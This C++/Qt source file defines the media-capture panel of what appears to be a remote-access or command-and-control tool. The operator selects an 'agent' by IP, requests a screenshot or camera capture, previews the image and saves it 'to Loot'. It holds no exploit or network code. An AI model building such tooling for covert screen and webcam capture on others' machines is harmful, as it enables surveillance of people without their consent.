#include "../../../include/ui/components/MediaPanel.hpp"
#include "../../../include/ui/StyleSheets.hpp"
#include "../../../include/database/Inferno_Database.hpp"
#include <QVBoxLayout>
#include <QHBoxLayout>
#include <QPixmap>
#include <QImage>
#include <QMessageBox>
#include <QLabel>

namespace inferno {

MediaPanel::MediaPanel(QWidget* parent)
    : QWidget(parent) {
    setupUI();
}

void MediaPanel::setupUI() {
    auto* layout = new QVBoxLayout(this);
    layout->setContentsMargins(10, 10, 10, 10);

    // Header
    auto* header = new QHBoxLayout();
    header->addWidget(new QLabel("MEDIA CAPTURE"));
    header->addStretch();
    auto* headerDesc = new QLabel("SCREENSHOT | CAMERA");
    headerDesc->setStyleSheet("color: #888; font-size: 11px;");
    header->addWidget(headerDesc);
    layout->addLayout(header);

    // Action buttons row
    auto* btnRow = new QHBoxLayout();
    m_agentSelector = new QComboBox();
    m_agentSelector->setPlaceholderText("Select agent...");
    m_agentSelector->setMinimumWidth(200);
    m_agentSelector->setStyleSheet(ui::style::INPUT_BOX);
    btnRow->addWidget(m_agentSelector);
    btnRow->addStretch();

    auto makeBtn = [](const char* text, const char* color) {
        auto* btn = new QPushButton(text);
        btn->setStyleSheet(
            QString("QPushButton { background-color: %1; color: #00ff41; "
                    "border: 1px solid #00ff41; padding: 8px 16px; "
                    "font-weight: bold; }"
                    "QPushButton:hover { background-color: %2; }"
                    "QPushButton:disabled { background-color: #333; "
                    "color: #666; border-color: #555; }")
                .arg(color).arg(color).replace("#004d00", "#006600"));
        btn->setEnabled(false);
        return btn;
    };

    m_btnScreenshot = makeBtn("📷 Screenshot", "#004d00");
    m_btnCamera = makeBtn("📷 Camera", "#1a1a2e");
    m_btnScreenshot->setStyleSheet(
        m_btnScreenshot->styleSheet() +
        "QPushButton { border-color: #00ff41; }");
    m_btnCamera->setStyleSheet(
        m_btnCamera->styleSheet() +
        "QPushButton { border-color: #4488ff; color: #4488ff; }"
        "QPushButton:hover { background-color: #1a1a4e; }");

    btnRow->addWidget(m_btnScreenshot);
    btnRow->addWidget(m_btnCamera);
    layout->addLayout(btnRow);

    auto updateButtons = [this]() {
        bool hasAgent = !m_agentSelector->currentText().isEmpty();
        m_btnScreenshot->setEnabled(hasAgent);
        m_btnCamera->setEnabled(hasAgent);
    };

    connect(m_agentSelector, &QComboBox::currentTextChanged, this,
            [updateButtons](const QString&) { updateButtons(); });
    connect(m_btnScreenshot, &QPushButton::clicked, this, [this]() {
        QString ip = m_agentSelector->currentText();
        if (!ip.isEmpty()) emit screenshotRequested(ip, 1);
    });
    connect(m_btnCamera, &QPushButton::clicked, this, [this]() {
        QString ip = m_agentSelector->currentText();
        if (!ip.isEmpty()) emit screenshotRequested(ip, 2);
    });

    // Preview area
    m_previewLabel = new QLabel();
    m_previewLabel->setAlignment(Qt::AlignCenter);
    m_previewLabel->setStyleSheet(
        "QLabel { background-color: #0a0a0a; border: 1px solid #333; "
        "min-height: 360px; color: #555; }");
    m_previewLabel->setText(
        "No media captured yet.\nSelect an agent and click Screenshot or Camera.");
    layout->addWidget(m_previewLabel, 1);

    // Save button
    m_btnSave = new QPushButton("Save to Loot");
    m_btnSave->setStyleSheet(
        "QPushButton { background-color: #1a1a2e; color: #888; "
        "border: 1px solid #555; padding: 6px 14px; }"
        "QPushButton:hover { background-color: #2a2a3e; color: #ccc; }"
        "QPushButton:disabled { color: #444; border-color: #333; }");
    m_btnSave->setEnabled(false);
    layout->addWidget(m_btnSave);

    connect(m_btnSave, &QPushButton::clicked, this, [this]() {
        if (!m_lastJpeg.isEmpty()) {
            emit saveToLootRequested(m_lastAgentIp, m_lastJpeg,
                                     m_lastWidth, m_lastHeight);
        }
    });
}

void MediaPanel::displayScreenshot(const QString& ip, const QByteArray& jpeg,
                                    int width, int height, bool success) {
    if (!success || jpeg.isEmpty()) {
        m_previewLabel->setText(
            QString("Media capture failed for %1.").arg(ip));
        m_btnSave->setEnabled(false);
        return;
    }

    m_lastJpeg = jpeg;
    m_lastWidth = width;
    m_lastHeight = height;
    m_lastAgentIp = ip;

    QPixmap pixmap;
    if (pixmap.loadFromData(jpeg, "JPEG")) {
        QPixmap scaled = pixmap.scaled(800, 600, Qt::KeepAspectRatio,
                                        Qt::SmoothTransformation);
        m_previewLabel->setPixmap(scaled);
        m_previewLabel->setText(QString());
    } else {
        m_previewLabel->setText("Failed to decode JPEG preview.");
    }

    m_btnSave->setEnabled(true);
    emit statusMessage(QString("Media received from %1 (%2x%3, %4 KB)")
                           .arg(ip)
                           .arg(width)
                           .arg(height)
                           .arg(jpeg.size() / 1024));
}

void MediaPanel::setAgentList(const QStringList& ips) {
    QString current = m_agentSelector->currentText();
    m_agentSelector->clear();
    m_agentSelector->addItems(ips);
    int idx = m_agentSelector->findText(current);
    if (idx >= 0) m_agentSelector->setCurrentIndex(idx);
    bool hasAgent = m_agentSelector->count() > 0;
    m_btnScreenshot->setEnabled(hasAgent);
    m_btnCamera->setEnabled(hasAgent);
}

} // namespace inferno
